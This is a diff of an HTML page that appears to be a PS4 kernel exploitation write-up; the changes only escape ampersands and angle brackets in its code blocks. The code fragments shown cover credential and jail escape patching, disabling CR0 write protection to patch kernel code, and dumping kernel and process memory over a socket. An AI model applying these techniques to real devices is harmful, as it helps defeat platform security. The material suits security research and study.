@@ -427,7 +427,7 @@ target remote localhost:8864</code></pre>
     return (struct idt_descriptor *)idt.rd_base;
 }
 
-xpageEntryHi = &(sidt()[IDT_PF]).off_high;</code></pre>
+xpageEntryHi = &amp;(sidt()[IDT_PF]).off_high;</code></pre>
 				
 				<br>
 				
@@ -495,7 +495,7 @@ xpageEntryHi = &(sidt()[IDT_PF]).off_high;</code></pre>
 				
 				<pre><code>void prefault(void *address, size_t size) {
 	uint64_t i;
-	for(i = 0; i < size; i++) {
+	for(i = 0; i &lt; size; i++) {
 		volatile uint8_t c;
 		(void)c;
 		
@@ -535,7 +535,7 @@ cred->cr_groups[0] = 0;</code></pre>
 					On the PS4, our process is also in a <a href="https://www.freebsd.org/doc/handbook/jails.html">FreeBSD jail</a>, so we'll also need to perform a <i>jailbreak</i>:
 				</p>
 				
-				<pre><code>cred->cr_prison = &prison0;</code></pre>
+				<pre><code>cred->cr_prison = &amp;prison0;</code></pre>
 				
 				<p>
 					This causes the <a href="https://github.com/freebsd/freebsd/blob/release/9.0.0/sys/kern/kern_jail.c#L3390"><code>jailed</code></a> check to return 0.
@@ -736,11 +736,11 @@ server.sin_port = sceNetHtons(9023);
 memset(server.sin_zero, 0, sizeof(server.sin_zero));
 
 int sock = sceNetSocket("dumper", AF_INET, SOCK_STREAM, 0);
-sceNetConnect(sock, (struct sockaddr *)&server, sizeof(server));
+sceNetConnect(sock, (struct sockaddr *)&amp;server, sizeof(server));
 
 // Disable packet queuing
 int flag = 1;
-sceNetSetsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (char *)&flag, sizeof(int));
+sceNetSetsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (char *)&amp;flag, sizeof(int));
 
 // Allocate and prefault over dump memory
 dump = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
@@ -762,7 +762,7 @@ memcpy(dump, (void *)0xffffffff8249ec10, 0x1000);
 int (*sys_sendto)(ScePthread td, struct sendto_args *uap) = (void *)0xffffffff8249ec10;
 struct sendto_args args = { sock, dump, 0x1000, 0, NULL, 0 };
 
-while(sys_sendto(td, &args) == EINTR);</code></pre>
+while(sys_sendto(td, &amp;args) == EINTR);</code></pre>
 				
 				<br>
 				
@@ -828,7 +828,7 @@ int payload(void *fp, int mode, void *active_cred, struct thread *td) {
 	int (*sendto)(struct thread *td, struct sendto_args *uap) = (void *)sys_sendto;
 	
 	struct sendto_args args = { sock, payloadMessage, strlen(payloadMessage), 0, NULL, 0 };
-	sendto(td, &args);
+	sendto(td, &amp;args);
 	
 	
 	// Restore original handler
@@ -869,7 +869,7 @@ int payload(void *fp, int mode, void *active_cred, struct thread *td) {
 					To make patches to kernel code, bit 16 of the <code>cr0</code> register should be cleared. This disables write protection on the CPU so that we can freely write to memory mapped as read only:
 				</p>
 				
-				<pre><code>#define X86_CR0_WP (1 << 16)
+				<pre><code>#define X86_CR0_WP (1 &lt;&lt; 16)
 
 static inline uint64_t readCr0(void) {
 	uint64_t cr0;
@@ -893,7 +893,7 @@ static inline void writeCr0(uint64_t cr0) {
 
 // Disable write protection
 uint64_t cr0 = readCr0();
-writeCr0(cr0 & ~X86_CR0_WP);
+writeCr0(cr0 &amp; ~X86_CR0_WP);
 
 // Patch something
 
@@ -944,7 +944,7 @@ mib[1] = KERN_PROC;
 mib[2] = KERN_PROC_PID;
 mib[3] = pid;
 
-if(sysctl(mib, 4, dump, &len, NULL, 0) == -1) perror("sysctl");
+if(sysctl(mib, 4, dump, &amp;len, NULL, 0) == -1) perror("sysctl");
 else if(len > 0) {
 	char *name = dump + 0x1bf;
 	char *thread = dump + 0x18a;
@@ -979,13 +979,13 @@ struct ptrace_io_desc pt_desc;
 
 char *readbuf = mmap(NULL, mappingSize, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
 
-for(offset = mappingAddress; offset < mappingAddress + mappingSize; offset += DUMP_SIZE) {
+for(offset = mappingAddress; offset &lt; mappingAddress + mappingSize; offset += DUMP_SIZE) {
 	pt_desc.piod_op = PIOD_READ_D;
 	pt_desc.piod_addr = readbuf;
 	pt_desc.piod_offs = offset;
 	pt_desc.piod_len = DUMP_SIZE;
 	
-	int ret = ptrace(PT_IO, pid, &pt_desc, NULL);
+	int ret = ptrace(PT_IO, pid, &amp;pt_desc, NULL);
 	if(!ret) sceNetSend(sock, readbuf, pt_desc.piod_len, 0);
 }</code></pre>
 				
